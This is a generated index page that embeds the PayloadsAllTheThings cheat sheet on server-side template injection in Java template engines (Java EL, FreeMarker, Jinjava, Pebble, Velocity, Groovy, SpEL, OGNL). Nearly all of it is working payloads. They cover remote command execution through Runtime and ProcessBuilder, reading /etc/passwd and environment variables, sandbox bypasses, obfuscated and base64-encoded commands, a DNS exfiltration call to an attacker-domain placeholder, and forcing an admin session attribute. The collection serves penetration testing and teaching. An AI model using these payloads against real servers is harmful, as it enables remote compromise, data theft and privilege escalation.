---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - Java

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-java` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Java.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Template Injection - Java](../../topics/server-side-template-injection/server-side-template-injection-java.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-template-injection-java |
| name | Server Side Template Injection - Java |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md |

## Preserved Source Material

````yaml
_body: "# Server Side Template Injection - Java\n\n> Server-Side Template Injection (SSTI)  is a security vulnerability that\
  \ occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute\
  \ arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating\
  \ engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
  - [Java EL](#java-el)\n    - [Java EL - Basic Injection](#java-el---basic-injection)\n    - [Java EL - Code Execution](#java-el---code-execution)\n\
  - [Freemarker](#freemarker)\n    - [Freemarker - Basic Injection](#freemarker---basic-injection)\n    - [Freemarker - Read\
  \ File](#freemarker---read-file)\n    - [Freemarker - Code Execution](#freemarker---code-execution)\n    - [Freemarker -\
  \ Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)\n    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)\n\
  - [Jinjava](#jinjava)\n    - [Jinjava - Basic Injection](#jinjava---basic-injection)\n    - [Jinjava - Command Execution](#jinjava---command-execution)\n\
  - [Pebble](#pebble)\n    - [Pebble - Basic Injection](#pebble---basic-injection)\n    - [Pebble - Code Execution](#pebble---code-execution)\n\
  - [Velocity](#velocity)\n- [Groovy](#groovy)\n    - [Groovy - Basic Injection](#groovy---basic-injection)\n    - [Groovy\
  \ - Read File](#groovy---read-file)\n    - [Groovy - HTTP Request:](#groovy---http-request)\n    - [Groovy - Command Execution](#groovy---command-execution)\n\
  \    - [Groovy - Command Execution with Obfuscation](#groovy---command-execution-with-obfuscation)\n    - [Groovy - Sandbox\
  \ Bypass](#groovy---sandbox-bypass)\n- [Spring Expression Language](#spring-expression-language)\n    - [SpEL - Basic Injection](#spel---basic-injection)\n\
  \    - [SpEL - Retrieve Environment Variables](#spel---retrieve-environment-variables)\n    - [SpEL - Retrieve /etc/passwd](#spel---retrieve-etcpasswd)\n\
  \    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)\n    - [SpEL - Session Attributes](#spel---session-attributes)\n\
  \    - [SpEL - Command Execution](#spel---command-execution)\n- [Object-Graph Navigation Language](#object-graph-navigation-language)\n\
  \    - [OGNL - Basic Injection](#ognl---basic-injection)\n    - [OGNL - Command Execution](#ognl---command-execution)\n\
  - [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format         |\n|---------------|------------------------|\n\
  | Codepen       | `#{ }`                 |\n| Freemarker    | `${ }`, `#{ }`, `[= ]` |\n| Groovy        | `${ }`       \
  \          |\n| Jinjava       | `{{ }}`                |\n| Pebble        | `{{ }}`                |\n| SpEL          |\
  \ `*{ }`, `#{ }`, `${ }` |\n| Thymeleaf     | `[[ ]]`                |\n| Velocity      | `#set($X=\"\") $X`       |\n\n\
  ## Java EL\n\n### Java EL - Basic Injection\n\nJava has multiple Expression Languages using similar syntax.\n\n> Multiple\
  \ variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.\n\n```java\n\
  ${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\"\
  ).getContent()}\n```\n\n### Java EL - Code Execution\n\n```java\n${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())}\
  \ // Rendered RCE\n${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))}\
  \ // Error-Based RCE\n${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} //\
  \ Boolean-Based RCE\n${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()}\
  \ // Time-Based RCE\n\n```\n\n---\n\n## Freemarker\n\n[Official website](https://freemarker.apache.org/)\n> Apache FreeMarker™\
  \ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code,\
  \ etc.) based on templates and changing data.\n\nYou can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)\n\
  \n### Freemarker - Basic Injection\n\nThe template can be :\n\n- Default: `${3*3}`  \n- Legacy: `#{3*3}`\n- Alternative:\
  \ `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)\n\n### Freemarker\
  \ - Read File\n\n```js\n${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\"\
  \ \")}\nConvert the returned bytes to ASCII\n```\n\n### Freemarker - Code Execution\n\n```js\n<#assign ex = \"freemarker.template.utility.Execute\"\
  ?new()>${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"\
  ?new()(\"id\")}\n#{\"freemarker.template.utility.Execute\"?new()(\"id\")}\n[=\"freemarker.template.utility.Execute\"?new()(\"\
  id\")]\n\n${(\"xx\"+(\"freemarker.template.utility.Execute\"?new()(\"id\")))?new()} // Error-Based RCE\n${1/((freemarker.template.utility.Execute\"\
  ?new()(\" … && echo UniqueString\")?chop_linebreak?ends_with(\"UniqueString\"))?string('1','0')?eval)} // Boolean-Based\
  \ RCE\n${\"freemarker.template.utility.Execute\"?new()(\"id && sleep 5\")} // Time-Based RCE\n```\n\n### Freemarker - Code\
  \ Execution with Obfuscation\n\nFreeMarker offers the built-in function: `lower_abc`. This function converts int-based values\
  \ into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation\
  \ for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):\n\nIf you\
  \ wanted a string that represents the string: \"id\", you could use the payload: `${9?lower_abc+4?lower_abc)}`.\n\nChaining\
  \ `lower_abc` to perform code execution (command: `id`):\n\n```js\n${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}\n\
  ```\n\nReference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n### Freemarker - Sandbox Bypass\n\n:warning: only works on Freemarker versions below 2.3.30\n\n```js\n<#assign classloader=article.class.protectionDomain.classLoader>\n\
  <#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\"\
  ).get(null)>\n<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>\n${dwf.newInstance(ec,null)(\"\
  id\")}\n```\n\n---\n\n## Jinjava\n\n[Official website](https://github.com/HubSpot/jinjava)\n> Java-based template engine\
  \ based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).\n\
  \n### Jinjava - Basic Injection\n\n```python\n{{'a'.toUpperCase()}} would result in 'A'\n{{ request }} would return a request\
  \ object like com.[...].context.TemplateContextRequest@23548206\n```\n\nJinjava is an open source project developed by Hubspot,\
  \ available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)\n\n### Jinjava - Command Execution\n\
  \nFixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)\n\n```ps1\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\
  \"new java.lang.String('xxx')\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\
  \"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\
  \"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\
  \")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\
  \"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\
  \")}}\n```\n\n---\n\n## Pebble\n\n[Official website](https://pebbletemplates.io/)\n\n> Pebble is a Java templating engine\
  \ inspired by [Twig](./PHP.md#twig) and similar to the Python [Jinja](./Python.md#jinja2) Template Engine syntax. It features\
  \ templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated\
  \ support for internationalization.\n\n### Pebble - Basic Injection\n\n```java\n{{ someString.toUPPERCASE() }}\n```\n\n\
  ### Pebble - Code Execution\n\nOld version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls\
  \ -la') }}`.\n\nNew version of Pebble :\n\n```java\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n     .forName('java.lang.Runtime')\n\
  \     .methods[6]\n     .invoke(null,null)\n     .exec(cmd)\n     .inputStream\n     .readAllBytes() %}\n{{ (1).TYPE\n \
  \    .forName('java.lang.String')\n     .constructors[0]\n     .newInstance(([bytes]).toArray()) }}\n```\n\n---\n\n## Velocity\n\
  \n[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)\n\n> Apache Velocity is a Java-based template\
  \ engine that allows web designers to embed Java code references directly within templates.\n\nIn a vulnerable environment,\
  \ Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes\
  \ the whoami command and prints the result:\n\n```java\n#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"\
  java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))\n$ex.waitFor()\n\
  #set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\n\
  ```\n\nA more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell\
  \ commands such as `echo \"a\" > /tmp/a`. Below is an example with `whoami` in base64:\n\n```java\n#set($base64EncodedCommand\
  \ = 'd2hvYW1p')\n\n#set($contextObjectClass = $knownContextObject.getClass())\n\n#set($Base64Class = $contextObjectClass.forName(\"\
  java.util.Base64\"))\n#set($Base64Decoder = $Base64Class.getMethod(\"getDecoder\").invoke(null))\n#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))\n\
  \n#set($StringClass = $contextObjectClass.forName(\"java.lang.String\"))\n#set($command = $StringClass.getConstructor($contextObjectClass.forName(\"\
  [B\"), $contextObjectClass.forName(\"java.lang.String\")).newInstance($decodedBytes, \"UTF-8\"))\n\n#set($commandArgs =\
  \ [\"/bin/sh\", \"-c\", $command])\n\n#set($ProcessBuilderClass = $contextObjectClass.forName(\"java.lang.ProcessBuilder\"\
  ))\n#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName(\"java.util.List\")).newInstance($commandArgs))\n\
  #set($processBuilder = $processBuilder.redirectErrorStream(true))\n#set($process = $processBuilder.start())\n#set($exitCode\
  \ = $process.waitFor())\n\n#set($inputStream = $process.getInputStream())\n#set($ScannerClass = $contextObjectClass.forName(\"\
  java.util.Scanner\"))\n#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName(\"java.io.InputStream\"\
  )).newInstance($inputStream))\n#set($scannerDelimiter = $scanner.useDelimiter(\"\\\\A\"))\n\n#if($scanner.hasNext())\n \
  \ #set($output = $scanner.next().trim())\n  $output.replaceAll(\"\\\\s+$\", \"\").replaceAll(\"^\\\\s+\", \"\")\n#end\n\
  ```\n\nError-Based RCE payload:\n\n```java\n#set($s=\"\")\n#set($sc=$s.getClass().getConstructor($s.getClass().forName(\"\
  [B\"), $s.getClass()))\n#set($p=$s.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")\n#set($n=$p.waitFor())\n\
  #set($b=\"Y:/A:/\"+$sc.newInstance($p.inputStream.readAllBytes(), \"UTF-8\"))\n#include($b)\n```\n\nBoolean-Based RCE payload:\n\
  \n```java\n#set($s=\"\")\n#set($p=$s.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\"))\n#set($n=$p.waitFor())\n\
  #set($r=$p.exitValue())\n#if($r != 0)\n#include(\"Y:/A:/xxx\")\n#end\n```\n\nTime-Based RCE payload:\n\n```java\n#set($s=\"\
  \")\n#set($p=$s.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\"))\n#set($n=$p.waitFor())\n#set($r=$p.exitValue())\n\
  #if($r != 0)\n#set($t=$s.getClass().forName(\"java.lang.Thread\").sleep(5000))\n#end\n```\n\n---\n\n## Groovy\n\n[Official\
  \ website](https://groovy-lang.org/)\n\n### Groovy - Basic injection\n\nRefer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html)\
  \ , but `${9*9}` is the basic injection.\n\n### Groovy - Read File\n\n```groovy\n${String x = new File('c:/windows/notepad.exe').text}\n\
  ${String x = new File('/path/to/file').getText('UTF-8')}\n${new File(\"C:\\Temp\\FileName.txt\").createNewFile();}\n```\n\
  \n### Groovy - HTTP Request\n\n```groovy\n${\"http://www.google.com\".toURL().text}\n${new URL(\"http://www.google.com\"\
  ).getText()}\n```\n\n### Groovy - Command Execution\n\n```groovy\n${\"calc.exe\".exec()}\n${\"calc.exe\".execute()}\n${this.evaluate(\"\
  9*9\") //(this is a Script class)}\n${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()}\n\
  ```\n\n### Groovy - Command Execution with Obfuscation\n\nYou can bypass security filters by constructing strings from ASCII\
  \ codes and executing them as system commands.\n\nPayload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.\n\
  \nExecute system command (command: `id`):\n\n```groovy\n${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}\n\
  ```\n\nReference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n### Groovy - Sandbox Bypass\n\n```groovy\n${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})\n\
  def x }\n```\n\nor\n\n```groovy\n${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert\
  \ java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") }\n```\n\n---\n\n## Spring Expression Language\n\n> Java\
  \ EL payloads also work for SpEL\n\n[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)\n\
  \n> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating\
  \ an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably\
  \ method invocation and basic string templating functionality.\n\n### SpEL - Basic Injection\n\n> SpEL has built-in templating\
  \ system using `#{ }`, but SpEL is also commonly used for interpolation using `${ }`.\n\n```java\n${7*7}\n${'patt'.toString().replace('a',\
  \ 'x')}\n${T(java.lang.Integer).valueOf('1')}\n```\n\n### SpEL - Retrieve Environment Variables\n\n```java\n${T(java.lang.System).getenv()}\n\
  ```\n\n### SpEL - Retrieve /etc/passwd\n\n```java\n${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}\n\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\n\
  ```\n\n### SpEL - DNS Exfiltration\n\nDNS lookup\n\n```java\n${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"\
  getByName\",\"\".getClass()).invoke(\"\",\"[ATTACKER.DOMAIN.TLD]\")}\n```\n\n### SpEL - Session Attributes\n\nModify session\
  \ attributes\n\n```java\n${pageContext.request.getSession().setAttribute(\"admin\",true)}\n```\n\n### SpEL - Command Execution\n\
  \n- Method using `java.lang.Runtime` #1 - accessed with JavaClass\n\n    ```java\n    ${T(java.lang.Runtime).getRuntime().exec(\"\
  whoami\")}\n    ```\n\n- Method using `java.lang.Runtime` #2\n\n    ```java\n    #{session.setAttribute(\"rtc\",\"\".getClass().forName(\"\
  java.lang.Runtime\").getDeclaredConstructors()[0])}\n    #{session.getAttribute(\"rtc\").setAccessible(true)}\n    #{session.getAttribute(\"\
  rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}\n    ```\n\n- Method using `java.lang.Runtime` #3 - accessed with `invoke`\n\
  \n    ```java\n    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}\n\
  \    ```\n\n- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`\n\n    ```java\n  \
  \  ${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\
  \\\\\"whoami\\\\\\\")\"))}\n    ```\n\n- Method using `java.lang.ProcessBuilder`\n\n    ```java\n    ${request.setAttribute(\"\
  c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}\n    ${request.getAttribute(\"c\").add(\"cmd.exe\"\
  )}\n    ${request.getAttribute(\"c\").add(\"/k\")}\n    ${request.getAttribute(\"c\").add(\"whoami\")}\n    ${request.setAttribute(\"\
  a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"\
  c\")).start())}\n    ${request.getAttribute(\"a\")}\n    ```\n  \n- Error-Based payload:\n  \n    ```java\n    ${T(java.lang.Integer).valueOf(\"\
  x\"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec(\"id\").inputStream.readAllBytes()))}\n\
  \    ```\n  \n- Boolean-Based payload:\n  \n    ```java\n    ${1/((T(java.lang.Runtime).getRuntime().exec(\"id\").waitFor()==0)?1:0)+\"\
  \"}\n    ```\n  \n- Time-Based payload:\n  \n    ```java\n    ${(T(java.lang.Runtime).getRuntime().exec(\"id\").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}\n\
  \    ```\n\n## Object-Graph Navigation Language\n\n[Official website](https://commons.apache.org/dormant/commons-ognl/)\n\
  \n> OGNL stands for Object-Graph Navigation Language; it is an expression language for getting and setting properties of\
  \ Java objects, plus other extras such as list projection and selection and lambda expressions. You use the same expression\
  \ for both getting and setting the value of a property.\n\n### OGNL - Basic Injection\n\n> OGNL can be used with different\
  \ tags like `${ }`\n\n```java\n7*7\n'patt'.toString().replace('a', 'x')\n@java.lang.Integer@valueOf('1')\n```\n\n### OGNL\
  \ - Command Execution\n\nRendered:\n\n```java\nnew String(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream().readAllBytes())\n\
  ```\n\nError-Based:\n\n```java\n(new String(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream().readAllBytes()))/0\n\
  ```\n\nBoolean-Based:\n\n```java\n1/((@java.lang.Runtime@getRuntime().exec(\"id\").waitFor()==0)?1:0)+\"\"\n```\n\nTime-Based:\n\
  \n```java\n((@java.lang.Runtime@getRuntime().exec(\"id\").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)\n```\n\n\
  ## References\n\n- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://web.archive.org/web/20200707130000/https://securitylab.github.com/research/bean-validation-RCE)\n\
  - [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://web.archive.org/web/20230203103413/https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)\n\
  - [Expression Language Injection - OWASP - December 4, 2019](https://web.archive.org/web/20200422030628/https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)\n\
  - [Expression Language injection - PortSwigger - January 27, 2019](https://web.archive.org/web/20251215015718/https://portswigger.net/kb/issues/00100f20_expression-language-injection)\n\
  - [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon\
  \ Vassilakopoulos - November 18, 2021](https://web.archive.org/web/20250219021221/https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)\n\
  - [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24,\
  \ 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)\n\
  - [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://web.archive.org/web/20181207164702/https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)\n\
  - [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://web.archive.org/web/20200923134700/https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)\n\
  - [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://web.archive.org/web/20250810034644/https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)\n\
  - [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)\n\
  - [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://web.archive.org/web/20150808084830/https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)\n\
  - [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://web.archive.org/web/20200501162014/https://www.youtube.com/watch?v=3cT0uE7Y87s)\n\
  - [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://web.archive.org/web/20220412162651/https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)\n\
  - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Server Side Template Injection/Java.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Java.md
````
